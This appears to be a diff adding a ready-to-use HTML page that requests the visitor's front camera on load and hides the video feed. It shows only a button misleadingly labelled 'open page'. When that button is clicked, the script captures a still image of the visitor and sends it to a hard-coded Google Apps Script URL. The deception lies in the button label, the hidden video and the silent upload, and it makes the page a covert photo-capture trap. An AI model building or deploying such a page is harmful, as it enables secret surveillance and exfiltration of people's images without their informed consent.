@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upload Image to Google Drive</title>
+    <style>
+        #video { display: none; }
+        #capture { font-size: 18px; padding: 10px; background-color: blue; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <button id="capture">open page</button>
+    <p id="status"></p>
+
+    <script>
+        // Replace with your Google Apps Script URL
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwqDWmQP_3-g_j_jhMEg9trG8_wKCUPkMJZMdvnXBMEtGAmcM8YbdLFavaatRaBzBMEqA/exec"; 
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", advanced: [{ torch: false }] } })
+        .then(stream => { document.getElementById('video').srcObject = stream; })
+        .catch(error => { console.error("Camera access denied!", error); });
+
+        document.getElementById('capture').addEventListener('click', function () {
+            let video = document.getElementById('video');
+            let canvas = document.getElementById('canvas');
+            let context = canvas.getContext('2d');
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            let imageData = canvas.toDataURL("image/png");
+
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: "POST",
+                body: JSON.stringify({ image: imageData }),
+                headers: { "Content-Type": "application/json" }
+            })
+            .then(response => response.text())
+            .then(data => { document.getElementById('status').innerText = "Upload Successful! " + data; })
+            .catch(error => console.error("Upload Failed!", error));
+        });
+    </script>
+
+</body>
+</html>
